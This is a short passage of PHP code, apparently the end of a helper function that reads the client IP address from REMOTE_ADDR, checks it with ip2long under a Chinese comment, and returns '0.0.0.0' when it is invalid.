        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // IP地址合法验证
    $ip = (false !== ip2long($ip)) ? $ip : '0.0.0.0';
    return $ip;
}
